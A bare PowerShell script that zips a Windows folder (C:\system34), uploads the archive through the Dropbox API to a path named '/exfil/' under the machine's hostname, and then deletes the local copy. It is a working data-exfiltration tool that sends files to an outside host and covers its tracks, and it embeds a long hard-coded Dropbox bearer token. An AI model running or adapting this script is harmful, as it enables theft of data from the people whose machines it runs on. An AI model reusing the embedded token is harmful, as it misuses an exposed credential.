# Define variables
$targetFolder = "C:\system34"
$hostname = $env:COMPUTERNAME
$zipFilePath = "$env:TEMP\$hostname.zip"

# Step 1: Zip the folder
if (Test-Path $targetFolder) {
    try {
        Compress-Archive -Path "$targetFolder\*" -DestinationPath $zipFilePath -Force
        Write-Host "Zipped folder to $zipFilePath" -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to zip the folder. $_"
        Exit
    }
} else {
    Write-Error "Target folder $targetFolder not found!"
    Exit
}
# Step 2: Dropbox upload
$token = "Bearer sl.u.AFyVgcVqDbSJUh16IefFHNMTEquiwBwRy3UNSefjScYhAcA4dnw_EnwxpOVZ58q89qQhrQ8_Q2Uef6vE35v-9HXmLq2HQtN8VzjqZ85RAAeC1t9GwIiWSOAQQdaG21l_cY_ZK_OEOg15FrhEAS4QY63qkN_xn8DTOKUzLYiQPJqlKe5fm1bK0NIQV3dI8QjIvJkufBmGxAYaqyFNKSJV14bnf3aOSjqrb_-Hr3zBSoUZgMK4DanYxt95J6j7yarwbDaePEJUz9cQ_nhunG3hvxSHX_vYM787yLltHZ9L8YiCxLOz8TUAGoU2W0EeZNnsoovjwiqL__VD_cyOoEv1TGh9XYjeoBSQ_V-4XQRaSf7aak8mO1UN63I2IcODIvLdWmrGxaO-w-hNQ2kZyYj1ykdFL4yxFUq-aKkFT133O66NOti2gqf_2m5OgmVNEkv55XICLOcfXwAMgKSOsKLq_BBu8em2N5Goz08Fk8uHRs1XGwKYMBA_VEs-LNbE8MsrpqdhxIXo_cZpmYfPqr3KQDwQdaia0vRBiwx2qcGiuRto6z--fU8TQFlx22oqAQuW4MhHTg4mBANfZVxDWa8tJkuSqHu8KiT7Gm6pxxcJgI66MwdojvmOynhALsq4JssPfOHTc0W1aJczbygWeGz2l9WUoNfQPpJgh6kix9jAjnooeZp0e_rQ9y9cb3DzTu6U6vIbhJL85O1txpfYlmm9oJ3uzvCOKiO0koDmVFw6AHo2rbQj7tOXJX1jmbY_IDLeQv4uu4Lx7gRmnT-t1P5H0S5JUAt8Wreg69SSEsRSpLTY4znQSXzjSFfxUhyX_hKmUjCre8VcBWqaVwEa29u1b9q6CK7AP5l5VA2JS5Uv54KfJURkIVjygxiWvTxmkc4bgTtd-SHDltW2FyWhD2n8SzkQTti0ZJY7ZOsolTi30_kyv9HOW7mMB2PhupIbXbTSPR_80AAZSolaXXqqlTcyCB8CxMKNag8oh4SNQ3YpBNP00fVoiMueNnIoqXfVT_ICgcc0rPkZcQ2CyJoxYdMWoP3xTeNWorv5lxJhESL1ee4MgC1twbyItnG6DxyQHJhL9Sz36CrFmtiw_4b47xnskZMSCDt7Qhwd_jsCKNKqvZq-U4Li36nui8DgsoumHtJNH-1-vfeMVHyyXeRGaa4mSzB6EJOpqIO884CyKfQIcRsNmdU1gx-VRyVBenA99vG44kR3ROVyRDvghoJASa73FVh29WDzLQDl7uCkn6BBprZyc_aT1zpfdY7ykTLCpchp3N7EDj-jCY3lXzspZRpwfhrHutZQShxUXVg58h5DdDnsiS52hY19H75PV4d8I9DisH0-5fUxzz3xiKX8Cnlj4v6PUc0TuGoB5ovWJDCxNAYh_ScEM7w6hk68UKw7fNdNM_gGcoad5BknOl0LI0cGfx_cpJL4GnT2Qd0kVvwWfl_Z8g"
$dropboxUploadPath = "/exfil/$hostname.zip"

try {
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
        -Headers @{
            "Authorization"      = $token
            "Dropbox-API-Arg"    = ('{{"path": "{0}", "mode": "add", "autorename": true, "mute": false}}' -f $dropboxUploadPath)
            "Content-Type"       = "application/octet-stream"
        } `
        -Method Post `
        -InFile $zipFilePath

    Write-Host "Upload successful: $zipFilePath → Dropbox:$dropboxUploadPath" -ForegroundColor Cyan
}
catch {
    Write-Error "Upload failed. $_"
    Exit
}

# Step 3: Cleanup
try {
    Remove-Item $zipFilePath -Force
    Write-Host "Cleaned up: $zipFilePath" -ForegroundColor Yellow
}
catch {
    Write-Warning "Failed to delete temp file: $zipFilePath"
}
